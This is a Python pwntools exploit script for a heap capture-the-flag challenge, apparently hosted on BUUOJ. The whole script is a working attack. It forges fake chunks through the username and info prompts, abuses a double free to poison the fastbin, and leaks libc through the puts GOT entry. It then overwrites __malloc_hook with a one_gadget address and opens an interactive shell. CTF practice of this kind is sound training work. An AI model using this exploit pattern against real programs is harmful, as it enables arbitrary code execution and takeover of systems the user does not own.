import sys
import time
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	if len(sys.argv)==1 :
		io=process('./pwn')
		elf=ELF('./pwn')
		libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
	else :
		io=remote('node3.buuoj.cn',28043)
		elf=ELF('pwn')
		libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

	def add(a,b):
		io.sendlineafter('>> ','1')
		io.sendlineafter('size\n',str(a))
		io.sendafter('content\n',b)

	def add2(size, content):
		time.sleep(0.1)
		io.sendline('1')
		time.sleep(0.1)
		io.send(str(size).ljust(8,'\x00'))
		time.sleep(0.1)
		io.send(content)

	def show():
		io.sendlineafter('>> ','3')

	def delete():
		io.sendlineafter('>> ','2')

	def a666(a,b):
		io.sendlineafter('>> ','666')
		io.sendlineafter('build or free?\n',str(a))
		if a == 1 :
			io.sendafter('please input your content\n',b)


	io.sendafter('please input your username:',p64(0)+p64(0x71)+p64(0x602060))
	io.sendafter('please input your info:',p64(0) + p64(0x21))
	a666(1,'a')
	add(0x18,'n')
	a666(2,'a')
	add(0x68,'aaaa')
	add(0x68,'bbbb')
	delete()
	a666(2,'a')
	delete()
	add(0x68,p64(0x602060))
	gdb.attach(io)
	pause()
	add(0x68,'aaaa')
	add(0x68,'aaaa')
	add(0x68,p64(0x602060)+'a'*0x10+p64(elf.got['puts'])+p64(0xdeadbeefdeadbeef))
	show()
	libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['puts']
	success('libc_base:'+hex(libc_base))
	add2(0x68, p64(libc_base+libc.sym['__malloc_hook'] - 0x23))
	add2(0x68, 'n')
	add2(0x68, 'b' * 0x13 + p64(libc_base + 0xf02a4) )
	io.sendline('2')


	


	

	#gdb.attach(io)
	#pause()
	io.interactive()